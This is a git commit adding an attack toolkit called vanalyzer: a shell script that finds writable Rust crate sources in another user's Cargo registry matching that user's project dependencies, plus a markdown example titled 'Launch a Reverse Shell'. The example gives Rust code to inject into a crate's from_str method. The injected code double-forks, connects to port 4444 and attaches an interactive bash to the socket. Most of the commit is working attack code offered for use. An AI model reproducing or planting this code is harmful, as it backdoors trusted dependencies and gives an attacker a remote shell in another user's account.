02c28c08cd28f610cbdc6bed7645aeadf5582158
lucas-cauhe <lcauhe@gmail.com>
2023-08-11 19:41:28 +0200

    vanalyzer

---
+++ examples/guessing_game.md
@@ -0,0 +1,44 @@
+# Launch a Reverse Shell
+
+Instead of writing a meaningless message from the source code, we'll write a payload that will spawn a reverse shell.
+
+From a user other than the one targeting, enter the previously selected method's source code and place the following code:
+
+```
+
+#[inline]
+fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
+    static mut IN: bool = false;
+    unsafe {
+        // Check we are not spawning multiple reverse shells
+        if !IN {
+            IN = true;
+            let pid = fork();
+            // let the child spawn the reverse shell
+            if pid == 0 {
+                // perform fork-decouple-fork (a.k.a double fork)
+                // this is important so that you avoid receiving a SIGTTIN that would send to the background the target user's program
+                let pid_child = fork();
+                if pid_child > 0 { std::process::exit(0) }
+                setsid();
+                let pid_gchild = fork();
+                if pid_gchild > 0 {std::process::exit(0)}
+                let sock = TcpStream::connect("localhost:4444").unwrap();
+                let fd = sock.as_raw_fd();
+                Command::new("/bin/bash")
+                    .arg("-i")
+                    .stdin(unsafe { Stdio::from_raw_fd(fd) })
+                    .stdout(unsafe { Stdio::from_raw_fd(fd) })
+                    .stderr(unsafe { Stdio::from_raw_fd(fd) })
+                    .spawn()
+                    .unwrap()
+                    .wait()
+                    .unwrap();
+                std::process::exit(0);
+            }
+        }
+    }
+    BigInt::from_str_radix(s, 10)
+}
+
+```
---
+++ vanalyzer/run.sh
@@ -0,0 +1,73 @@
+#!/bin/bash
+
+read_cargo_file () {
+  list_deps=""
+  last_found=0
+  in_deps=0
+  while read line && [ $last_found -eq 0 ]; do 
+    if [ "$line" == "[dependencies]" ]; then
+      in_deps=1
+    elif [[ $in_deps -eq 1 ]] && [[ $line =~ ^\[.*\]$ ]]; then
+      last_found=1
+    elif [ $in_deps -eq 1 ]; then
+      list_deps="${list_deps}&${line}"
+    fi
+  done < "$1"
+  echo $list_deps | tr '&' '\n' 
+}
+
+join_deps_version () {
+  result_list=""
+  while read dep; do
+    dep_name=$(echo $dep | cut -d '=' -f1 | tr '_' '-')
+    version=""
+    if [[ $(echo $dep | cut -d '=' -f2- <<< "$dep") =~ \{.*\} ]]; then
+      version=$(echo $dep | egrep -o "version\ *=\ *\".*\..*\..*\"," | cut -d ',' -f1) 
+    else
+      version=$dep
+    fi
+    version=$(echo $version | cut -d '=' -f2 | tr '\"' " ")
+    if [ "$version" != "" ]; then
+      result_list="${result_list}${dep_name}-$version&" 
+    fi
+  done <<< "$1" 
+  echo $result_list | tr '&' '\n'| sed 's/\ //g' 
+}
+
+match_crates () {
+   matched_crates=""
+   while read line; do
+      ls /home/${target_user}/.cargo/registry/src/* | grep "$line" &>/dev/null 
+      [ $? -eq 0 ] && matched_crates="${matched_crates}${line}&"
+   done <<< "$1"
+   echo $matched_crates | tr '&' '\n'
+}
+
+
+# parse clargs
+target_project="$1" 
+target_user="$2"
+# list deps in target cargo project inside Cargo.toml file
+[ ! -f "${target_project}/Cargo.toml"  ] && echo "Target project specified is not a cargo project or Cargo.toml
+file was not found" && exit 1
+
+all_writable_files="$(find /home/${target_user}/.cargo/registry/src/* -type f -writable -print | egrep "*\.rs")"
+
+list_deps=$(read_cargo_file "${target_project}/Cargo.toml")
+deps_versioned=$(join_deps_version "$list_deps")
+# match exact version
+matching_crates=$(match_crates "$deps_versioned") 
+
+[ "$matching_crates" == "" ] && echo "No suitable crates have been found in the archive" && exit 0
+
+# get matching writable files
+vulnerable_crate_files=""
+while read line; do
+  vuln_files="$(echo "$all_writable_files" | grep $line)"
+  vulnerable_crate_files="${vulnerable_crate_files}${vuln_files}&"
+done <<< "$matching_crates"
+
+echo $vulnerable_crate_files | tr '&' '\n' | tr ' ' '\n'
+# find crate methods used in cargo project
+
+
